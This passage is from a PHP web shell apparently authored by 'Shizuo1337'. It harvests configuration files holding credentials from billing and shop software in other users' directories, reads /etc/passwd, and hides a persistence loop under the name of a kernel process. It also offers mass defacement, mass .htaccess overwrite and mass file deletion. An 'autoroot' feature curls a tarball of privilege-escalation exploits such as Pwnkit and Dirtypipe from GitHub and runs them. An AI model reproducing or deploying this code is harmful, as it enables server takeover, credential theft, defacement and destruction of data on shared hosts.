"/home/$user_shiz/public_html/Purchase/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/purchase/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/ACCOUNT/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Account/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/account/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/USER/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/User/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/user/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/CLIENTS/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Clients/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/clients/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/BILLINGS/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Billings/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/billings/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/MY/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/My/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/my/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/secure/whm/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/secure/whmcs/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/panel/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/clientes/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/cliente/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/support/order/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/boxbilling/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/box/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/host/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/Host/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/supportes/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/support/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/hosting/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/cart/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/order/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/client/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/clients/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/cliente/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/clientes/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/billing/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/billings/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/my/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/secure/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/support/order/bb-config.php" => "BoxBilling", "/home/$user_shiz/public_html/includes/dist-configure.php" => "Zencart", "/home/$user_shiz/public_html/zencart/includes/dist-configure.php" => "Zencart", "/home/$user_shiz/public_html/products/includes/dist-configure.php" => "Zencart", "/home/$user_shiz/public_html/cart/includes/dist-configure.php" => "Zencart", "/home/$user_shiz/public_html/shop/includes/dist-configure.php" => "Zencart", "/home/$user_shiz/public_html/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/hostbills/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/host/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/Host/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/supportes/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/support/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/hosting/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/cart/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/order/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/client/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/clients/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/cliente/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/clientes/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/billing/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/billings/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/my/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/secure/includes/iso4217.php" => "Hostbills", "/home/$user_shiz/public_html/support/order/includes/iso4217.php" => "Hostbills");
        foreach ($grab_config as $config => $nama_config) {
            if ($_POST['config'] == 'grab') {
                $ambil_config = file_get_contents($config);
                if ($ambil_config == '') {
                } else {
                    $file_config = fopen("configgrab/$user_shiz-$nama_config.txt", "w");
                    fputs($file_config, $ambil_config);
                }
            }
            if ($_POST['config'] == 'symlink') {
                @symlink($config, "Symconfig/" . $user_shiz . "-" . $nama_config . ".txt");
            }
            if ($_POST['config'] == '404') {
                $sym404 = symlink($config, "sym404/" . $user_shiz . "-" . $nama_config . ".txt");
                if ($sym404) {
                    @mkdir("sym404/" . $user_shiz . "-" . $nama_config . ".txt404", 0777);
                    $htaccess = "Options Indexes FollowSymLinks
DirectoryIndex shiz.htm
HeaderName shiz.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";
                    @file_put_contents("sym404/" . $user_shiz . "-" . $nama_config . ".txt404/.htaccess", $htaccess);
                    @symlink($config, "sym404/" . $user_shiz . "-" . $nama_config . ".txt404/shiz.txt");
                }
            }
        }
    }
    if ($_POST['config'] == 'grab') {
        echo '<center><br><br><a href="configgrab/" target="_blank"><font color=lime>Done</font></a></center>';
    }
    if ($_POST['config'] == '404') {
        echo '<center><br><br>
<a href="sym404/root/" target="_blank">Root</a>
<br><br><a href="sym404/" target="_blank">Configurations</a></center>';
    }
    if ($_POST['config'] == 'symlink') {
        echo '<center><br><br>
<a href="symconfig/root/" target="_blank">Root</a>
<br><br><a href="symconfig/" target="_blank">Configurations</a></center>';
    }
    if ($_POST['config'] == 'symvhost') {
        echo '<center><br><br>
<a href="symvhost/root/" target="_blank">Root Server</a>
<br><br><a href="symvhost/" target="_blank">Configurations</a></center>';
        }
    } else {
       echo '<form method="post" action=""><textarea name="passwd" class="form-control" rows="15" readonly>
';
if(is_readable('/etc/passwd')) {
  readfile("/etc/passwd") or include ("/etc/passwd") or die("Unable to open file!");
} else {
  echo ("Unable to open file!");
}
    echo '</textarea></br><div class="input-group">
        <select class="form-control btn-sm" name="config">
        <option value="404">Config 404</option>
        <option value="grab">Config Grab</option>
        <option value="symlink">Symlink Config</option>
        <option value="symvhosts">Vhosts Config Grabber</option></select><input class="btn btn-outline-light text-purple" type="submit" value="Submit!!"></div> </form></center>
';
    }
}

function jump() {
if (file_exists("/etc/passwd")) {
        $i = 0;
        $passwd = file_get_contents("/etc/passwd");
        preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
        foreach ($user_jumping[1] as $user_pro_jump) {
            $user_jumping_dir = "/home/$user_pro_jump/public_html";
            if (is_readable($user_jumping_dir)) {
                $i++;
                $type = "[<font color=white>R</font>] <a href='?dir=$user_jumping_dir' target='_blank'><font color=#ffb101>$user_jumping_dir</font></a>";;
                if (is_writable($user_jumping_dir)) {
                    $type = "[<font color=white>RW</font>] <a href='?dir=$user_jumping_dir' target='_blank'><font color=#ffb101>$user_jumping_dir</font></a>";
                }
                echo $type;
                if (function_exists('posix_getpwuid')) {
                    $domain_jump = file_get_contents("/etc/named.conf");
                    if ($domain_jump == '') {
                        $domain = "Can't get domain";
                    } else {
                        preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                        foreach ($domains_jump[1] as $dj) {
                            $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                            $user_jumping_url = $user_jumping_url['name'];
                            if ($user_jumping_url == $user_pro_jump) {
                                echo " => ( <u>$dj</u> )<br>";
                                break;
                            }
                        }
                    }
                } else {
                    echo "<br>";
                }
            }
        }
    }
if ($i == 0) {
} else {
    echo "<br>Total " . $i . " Directory " . gethostbyname($_SERVER['HTTP_HOST']) . "";
}
}

 function lockfileshidden() { $lockname = $_POST["lockfiless"]; $dirna = getcwd(); $_1_3_3_7_ = sys_get_temp_dir(); if (!is_dir($_1_3_3_7_ . "/.sess")) { mkdir($_1_3_3_7_ . "/.sess"); } if (!is_file($_1_3_3_7_ . '/.sess/' . nameShiz() . ".dat")) { copy($dirna.'/'.$lockname, $_1_3_3_7_ . "/.sess/" . nameShiz() . ".dat"); } if (file_exists($_1_3_3_7_ . "/.sess/" . nameShiz() . ".dat")) { $_1_3_3_ = $_1_3_3_7_ . "/.sess/" . nameShiz() . ".dat"; file_put_contents($_1_3_3_7_ . "/.sess/" . handlerNa() . ".dat", '<?php while(True){if(!file_exists("' . $dirna . '")){mkdir("' . $dirna . '");}if(!file_exists("' . $dirna . '/' . $lockname . '")){copy("' . $_1_3_3_ . '","' . $dirna . '/' . $lockname . '");}if(fileperms("' . $dirna . '/' . $lockname . '")!="0555"){chmod("' . $dirna . '/' . $lockname . '",0555);}if(fileperms("' . $dirna . '")!="0555"){chmod("' . $dirna . '",0555);}} ?>'); chmod($dirna.'/'.$lockname, 0555); chmod($dirna, 0555);
    $a = "'$(printf [kblockd])'";
    exe('bash -c "exec -a ' . $a . ' php ' . $_1_3_3_7_ . '/.sess/' . handlerNa() . '.dat > /dev/null 2>&1 &"'); } }

function backup() { 

$nama_file = basename(__FILE__);

$backup_dir = 'backup';

$jumlah_salinan = 5;

for ($i = 1; $i <= $jumlah_salinan; $i++) {
    if (!is_dir("$backup_dir/$i")) {
        mkdir("$backup_dir/$i", 0711, true);
    }

    // Salin file ke direktori backup
    if (copy($nama_file, "$backup_dir/$i/$nama_file")) {
        echo "Backup berhasil dibuat.<br>";
    } else {
        echo "Gagal membuat backup.<br>";
    }
}

}

// Mass Deface
function massdeface($path) {
    function mass_all($dir,$namefile,$contents_sc) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $▚ = $dirc.'/'.$namefile;
                if($dirb === '.') {
                    file_put_contents($▚, $contents_sc);
                } elseif($dirb === '..') {
                    file_put_contents($▚, $contents_sc);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<gr><i class='fa fa-check-all'></i></gr>]&nbsp;$▚<br>";
                            file_put_contents($▚, $contents_sc);
                            $▟ = mass_all($dirc,$namefile,$contents_sc);
                            }
                        }
                    }
                }
            }
        }
        function mass_onedir($dir,$namefile,$contents_sc) {
            if(is_writable($dir)) {
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $▚ = $dirc.'/'.$namefile;
                    if($dirb === '.') {
                        file_put_contents($▚, $contents_sc);
                    } elseif($dirb === '..') {
                        file_put_contents($▚, $contents_sc);
                    } else {
                        if(is_dir($dirc)) {
                            if(is_writable($dirc)) {
                                echo "[<gr><i class='fa fa-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
                                file_put_contents($▚, $contents_sc);
                            }
                        }
                    }
                }
            }
        }
    if (isset($_POST['start'])) {
        $name = $_POST['massDefName'];
        echo "<center>------- Result -------</center>";
        echo '<div class="card text-purple col-md-7 mb-3 mt-2">';
        echo "<pre>Done ~~<br><br>$name<br>";
        if($_POST['tipe'] == 'mass') {
            mass_all($_POST['massDefDir'], $_POST['massDefName'], $_POST['massDefContent']);
        } else {
            mass_onedir($_POST['massDefDir'], $_POST['massDefName'], $_POST['massDefContent']);
        }
        echo '</pre></div>';
    } else {
        echo '<!-- mass deface -->  ';
        echo '<div class="col-md-5">';
        echo '<form action="" method="post">';
        echo '<div class="mb-3">';
        echo "<div class='form-check'>
                <input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
                <label class='form-check-label' for='flexCheckDefault'>One directory</label>
            </div>
            <div class='form-check'>
                <input class='form-check-input' type='checkbox' value='mass' name='tipe' id='flexCheckDefault'>
                <label class='form-check-label' for='flexCheckDefault'>All directory</label>
            </div>";
        echo '<label class="form-label">Directory</label>';
        echo "<input type='text' class='form-control' name='massDefDir' value='$path'>";
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">File Name</label>';
        echo '<input type="text" class="form-control" name="massDefName" placeholder="test.php">';
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">File Content</label>';
        echo '<textarea class="form-control" name="massDefContent" rows="7" placeholder="Hello World"></textarea>';
        echo '</div>';
        echo '<button class="btn btn-outline-light text-purple" type="submit" name="start">Submit</button>';
        echo '</form>';
        echo '</div>';
    }
}

function masshtaccess($path) {
    function massht_all($dir,$namefile,$contents_sc) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $▚ = $dirc.'/'.$namefile;
                if($dirb === '.') {
                    file_put_contents($▚, $contents_sc);
                } elseif($dirb === '..') {
                    file_put_contents($▚, $contents_sc);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<gr><i class='fa fa-check-all'></i></gr>]&nbsp;$▚<br>";
                            file_put_contents($▚, $contents_sc);
                            $▟ = mass_all($dirc,$namefile,$contents_sc);
                            }
                        }
                    }
                }
            }
        }
        function massht_onedir($dir,$namefile,$contents_sc) {
            if(is_writable($dir)) {
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $▚ = $dirc.'/'.$namefile;
                    if($dirb === '.') {
                        file_put_contents($▚, $contents_sc);
                    } elseif($dirb === '..') {
                        file_put_contents($▚, $contents_sc);
                    } else {
                        if(is_dir($dirc)) {
                            if(is_writable($dirc)) {
                                echo "[<gr><i class='fa fa-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
                                file_put_contents($▚, $contents_sc);
                            }
                        }
                    }
                }
            }
        }
    if (isset($_POST['start'])) {
        $name = $_POST['massDefName'];
        echo "<center>------- Result -------</center>";
        echo '<div class="card text-purple col-md-7 mb-3 mt-2">';
        echo "<pre>Done ~~<br><br>$name<br>";
        if($_POST['tipe'] == 'mass') {
            massht_all($_POST['massDefDir'], "\x2E\x68\x74\x61\x63\x63\x65\x73\x73", $_POST['massDefContent']);
        } else {
            massht_onedir($_POST['massDefDir'], "\x2E\x68\x74\x61\x63\x63\x65\x73\x73", $_POST['massDefContent']);
        }
        echo '</pre></div>';
    } else {
        echo '<!-- mass deface -->  ';
        echo '<div class="col-md-5">';
        echo '<form action="" method="post">';
        echo '<div class="mb-3">';
        echo "<div class='form-check'>
                <input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
                <label class='form-check-label' for='flexCheckDefault'>One directory</label>
            </div>
            <div class='form-check'>
                <input class='form-check-input' type='checkbox' value='mass' name='tipe' id='flexCheckDefault'>
                <label class='form-check-label' for='flexCheckDefault'>All directory</label>
            </div>";
        echo '<label class="form-label">Directory</label>';
        echo "<input type='text' class='form-control' name='massDefDir' value='$path'>";
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">File Content</label>';
        echo '<textarea class="form-control" name="massDefContent" rows="7" placeholder="Hello World"></textarea>';
        echo '</div>';
        echo '<button class="btn btn-outline-light text-purple" type="submit" name="start">Submit</button>';
        echo '</form>';
        echo '</div>';
    }
}

// Mass Delete
function massdelete($path) {
    function massdel($dir, $file) {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$file;
                if ($dirb === '.') {
                    if (file_exists("$dir/$file")) {
                        unlink("$dir/$file");
                    }
                } elseif ($dirb === '..') {
                    if (file_exists(''.dirname($dir)."/$file")) {
                        unlink(''.dirname($dir)."/$file");
                    }
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            if ($lokasi) {
                                echo "$lokasi > Deleted\n";
                                unlink($lokasi);
                                $massdel = massdel($dirc, $file);
                            }
                        }
                    }
                }
            }
        }
    }
    if (isset($_POST['massDel']) && isset($_POST['massDelName'])) {
        $name = $_POST['massDelName'];
        echo "<center>------- Result -------</center>";
        echo '<div class="card text-purple col-md-7 mb-3 mt-2">';
        echo "<pre>Done ~~<br><br>./$name > Deleted<br>";
        massdel($_POST['massDel'], $name);
        echo '</pre></div>';
    } else {
        echo '<!-- mass delete -->  ';
        echo '<div class="col-md-5">';
        echo '<form action="" method="post">';
        echo '<div class="mb-3">';
        echo '<label class="form-label">Directory</label>';
        echo "<input type='text' class='form-control' name='massDel' value='$path'>";
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">File Name</label>';
        echo '<input type="text" class="form-control" name="massDelName" placeholder="test.php">';
        echo '</div>';
        echo '<button class="btn btn-outline-light text-purple" type="submit">Submit</button>';
        echo '</form>';
        echo '</div>';
    }
}

function root($set,$sad) {
    $x = "preg_match";
    $xx = "2>&1";
    if (!$x("/".$xx."/i", $set)) {
        $set = $set." ".$xx;
    }
    $a = "function_exists";
    $b = "proc_open";
    $c = "htmlspecialchars";
    $d = "stream_get_contents";
    if ($a($b)) {
        $ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
        return $d($pink[1]);
    } else {
        return "proc_open function is disabled!";
    }
}
//  Mail test
function autoroot() {
    $phtt = getcwd();
    if (isset($_GET['action']) && $_GET['action'] == 'autoroot') {
        if (!is_dir($phtt."/shizuoroot")) {
                    mkdir($phtt."/shizuoroot");
                    root("curl https://raw.githubusercontent.com/shizuo1337/list/main/auto.tar.gz -o auto.tar.gz", $phtt."/shizuoroot");
                    root("tar -xf auto.tar.gz", $phtt."/shizuoroot");
                    if (!file_exists($phtt."/shizuoroot/netfilter")) {
                        die("<center class='text-purple'>Failed to Download Material !</center>");
                    }
                }
  echo '<div class="p-2">
            <div class="row justify-content-center">
                <div class="card text-purple col-md-7 mb-3">
                        <pre><code>Netfilter : '.root("timeout 10 ./shizuoroot/netfilter", $phtt).'Ptrace : '.root("echo id | timeout 10 ./shizuoroot/ptrace", $phtt).'Sequoia : '.root("timeout 10 ./shizuoroot/sequoia", $phtt).'OverlayFS : '.root("echo id | timeout 10 ./overlayfs", $phtt."/shizuoroot").'Dirtypipe : '.root("echo id | timeout 10 ./shizuoroot/dirtypipe /usr/bin/su", $phtt).'Sudo : '.root("echo 12345 | timeout 10 sudoedit -s Y", $phtt).'Pwnkit : '.root("echo id | timeout 10 ./pwnkit", $phtt."/shizuoroot").'</code></pre>
                    </div>
            </div>
        </div>';
    }
}
function scansuid() {
    if (isset($_GET['action']) && $_GET['action'] == 'scansuid') {
        echo '<div class="p-2">
            <div class="row justify-content-center">
                <div class="card text-purple col-md-7 mb-3">
                        <pre><code>'.exe("find / -perm -u=s -type f 2>/dev/null").'</code></pre>
                    </div>
            </div>
        </div>';
    }
}

function DelDir($dir) {
    if (!is_dir($dir)) {
        return false;
    }

    // Hapus isi direktori
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $path = $dir . '/' . $file;
            if (is_dir($path)) {
                DelDir($path); // Panggil rekursif untuk menghapus isi direktori
            } else {
                unlink($path); // Hapus file
            }
        }
    }

    // Hapus direktori itu sendiri
    if (rmdir($dir)) {
        return true; // Direktori berhasil dihapus
    } else {
        return false; // Gagal menghapus direktori
    }
}


if (isset($_POST['newFolderName'])) {
    if (mkdir($path . '/' . $_POST['newFolderName'])) {
        flash("Create Folder Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create Folder Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
    if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) {
        flash("Create File Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create File Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newName']) && isset($_GET['item'])) {
    if ($_POST['newName'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (rename($path. '/'. $_GET['item'], $_POST['newName'])) {
        flash("Rename Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Rename Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newContent']) && isset($_GET['item'])) {
    if (file_put_contents($path. '/'. $_GET['item'], $_POST['newContent'])) {
        flash("Edit Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Edit Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newPerm']) && isset($_GET['item'])) {
    if ($_POST['newPerm'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (chmod($path. '/'. $_GET['item'], octdec($_POST['newPerm']))) {
        flash("Change Permission Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Change Permission", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newDate']) && isset($_GET['item'])) {
    if ($_POST['newDate'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (touch($path. '/'. $_GET['item'], strtotime($_POST['newDate']))) {
        flash("Change Date Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Change Date", "Failed", "error", "?dir=$path");
    }
}
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    if ($action == 'delete' && isset($_GET['item'])) {
        if (is_dir($_GET['item'])) {
            if (DelDir($_GET['item'])) {
                flash("Delete Folder Successfully!", "Success", "success", "?dir=$path");    
            } else {
                flash("Delete Folder Failed", "Failed", "error", "?dir=$path");
            }
        } else {
            if (unlink($_GET['item'])) {
                flash("Delete File Successfully!", "Success", "success", "?dir=$path");
            } else {
                flash("Delete File Failed", "Failed", "error", "?dir=$path");
            }
        }
    }
}

if (isset($_FILES['uploadfile'])) {
    $total = count($_FILES['uploadfile']['name']);
    for ($i = 0; $i < $total; $i++) {
        $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
    }
    if ($total < 2) {
        if ($mainupload) {
            flash("Upload File Successfully! ", "Success", "success", "?dir=$path");
        } else {
            flash("Upload Failed", "Failed", "error", "?dir=$path");
        }
    }
    else{
        if ($mainupload) {
            flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
        } else {
            flash("Upload Failed", "Failed", "error", "?dir=$path");
        }
    }
}

if($_POST["getf"] == "download")
     if(fdown($_POST['filedown'], $_POST['namefile'])){
        echo '<font color="red">Gagal Cuk!!!</font>';
    }else{
        echo '<a href="'.$_POST['namefile'].'" target="_blank">'.$_POST['namefile'].'</a>';
    }

$dirs = scandir($path);

$d0mains = @file("/etc/named.conf", false);
if (!$d0mains){
    $dom = "Cant read /etc/named.conf";
    $GLOBALS["need_to_update_header"] = "true";
}else{
    $count = 0;
    foreach ($d0mains as $d0main){
        if (@strstr($d0main, "zone")){
            preg_match_all('#zone "(.*)"#', $d0main, $domains);
            flush();
            if (strlen(trim($domains[1][0])) > 2){
                flush();
                $count++;
            }
        }
    }
    $dom = "$count Domain";
}

$phpver = PHP_VERSION;
$phpos = PHP_OS;
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$uip = $_SERVER['REMOTE_ADDR'];
$serv = $_SERVER['HTTP_HOST'];
$soft = $_SERVER['SERVER_SOFTWARE'];
$x_uname = exe("uname -a");
$uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($x_uname) > 0 ? $x_uname : 'Uname Error!');
$sql = function_exists('mysqli_connect') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $curl = function_exists('curl_init') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            function ifExist($path) {
                return file_exists($path);
            }

            $wget = ifExist('/usr/bin/wget') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $pl = ifExist('/usr/bin/perl') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $py = ifExist('/usr/bin/python') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $gcc = ifExist('/usr/bin/gcc') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $pkexec = ifExist('/usr/bin/pkexec') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $disfunc = @ini_get("disable_functions");
            if (empty($disfunc)) {
                $disfc = "<gr>NONE</gr>";
            } else {
                $disfc = "<rd>$disfunc</rd>";
            }
?>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow">
        <link rel="icon" href="https://cdn.shizuosec.id/t7jodwsa35/Shizuosec.webp">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
        <title><?= $nm; ?> | [ <?= $serv; ?> ]</title>
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
        <style type="text/css">
            * {
                font-family: Ubuntu Mono;
            }
            a {
                text-decoration: none;
                color: white;
            }
            a:hover {
                color: white;
            }
            /* width */
            ::-webkit-scrollbar {
                width: 7px;
                height: 7px;
            }
            /* Handle */
            ::-webkit-scrollbar-thumb {
                background: grey;
                border-radius: 7px;
            }
            /* Track */
            ::-webkit-scrollbar-track {
                box-shadow: inset 0 0 7px grey;
                border-radius: 7px;
            }
            .td-break {
                word-break: break-all
            }
            .text-purple {
                color:#029bfa;
            }
            gr {color:#54A700;}
            rd {color:red;}
            .kanan {
                text-align: right;
                margin-top: -10px;
                font-size:12px;
            }
        </style>
    </head>
    <body class="bg-dark text-purple">
        <center><img src="https://cdn.shizuosec.id/t7jodwsa35/Shizuosec.webp" alt="logo" width="400" height="400"></center>
        <div class="container-fluid">
            <div class="py-3" id="main">
                <div class="p-4 rounded-3">
                    <table class="table table-borderless text-purple">
                        <tr>
                            <td style="width: 7%;">Author</td>
                            <td style="width: 1%">:</td>
                            <td><font color="lime">Shizuo1337</font></td>
                        </tr>
                        <tr>
                            <td style="width: 7%;">Permission</td>
                            <td style="width: 1%">:</td>
                            <td>[&nbsp;<?php echo writable($path, perms($path)) ?>&nbsp;]</td>
                        </tr>
                    </table>
                    <div class="bkp table-responsive">
                        <i class="fa fa fa-folder"></i>
                        <?php foreach ($exdir as $id => $pat) : if ($pat == '' && $id == 0): ?>

                            <a href="?dir=/" class="text-decoration-none text-purple">/</a>
                        <?php endif; if ($pat == '') continue; ?>

                            <a href="?dir=<?php for ($i = 0; $i <= $id; $i++) { echo "$exdir[$i]"; if ($i != $id) echo "/"; } ?>" class="text-decoration-none text-purple"><?= $pat ?></a>
                            <span class="text-purple">/</span>
                        <!-- endforeach -->
                        <?php endforeach; ?>

                    </div>
                    <div class="kanan py-3" id="infoo">
                        <button class="btn btn-outline-light text-purple" data-bs-toggle="collapse" data-bs-target="#collapseinfo" aria-expanded="false" aria-controls="collapseinfo"><i class="fa fa-info-circle"></i> Info <i class="fa fa-chevron-down"></i></button>
                    </div>
                        <div class="collapse text-purple mb-3" id="collapseinfo">
                            <div class="box shadow bg-light p-4 rounded-3">
                                System: <gr><?= $uname; ?></gr><br>
                                Software: <gr><?= $soft; ?></gr><br>
                                PHP version: <gr><?= $phpver; ?></gr> | PHP os: <gr><?= $phpos; ?></gr><br>
                                Domains: <gr><?= $dom; ?></gr><br>
                                Server Ip: <gr><?= $ip; ?></gr><br>
                                Your Ip: <gr><?= $uip; ?></gr><br>
                                User: <gr><?= $downer; ?></gr> | Group: <gr><?= $dgrp; ?></gr><br>
                                Safe Mode: <?= $sm; ?><br>
                                MYSQL: <?= $sql; ?> | PERL: <?= $pl; ?> | PYTHON: <?= $py; ?> | WGET: <?= $wget; ?> | CURL: <?= $curl; ?> | GCC: <?= $gcc; ?> | PKEXEC: <?= $pkexec; ?><br>
                                Disable Function:<br><pre><?= $disfc; ?></pre>
                            </div>
                        </div>
                    <!-- configuration fiture -->
                    <div id="tools">
                        <center>
                            <hr width='20%'>
                        </center>
                        <div class="d-flex justify-content-center flex-wrap my-3">
                            <a href="<?= $_SERVER['PHP_SELF']; ?>" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-home"></i> Home</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=upload" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-upload"></i> Upload</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=getfile" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-upload"></i> Get File</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=adminer" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-upload"></i> Get Adminer</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=scanshell" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-upload"></i> Get ScanShell</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=createrdp" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-upload"></i> Create RDP</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=backup" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-upload"></i> Backup Shell</a>
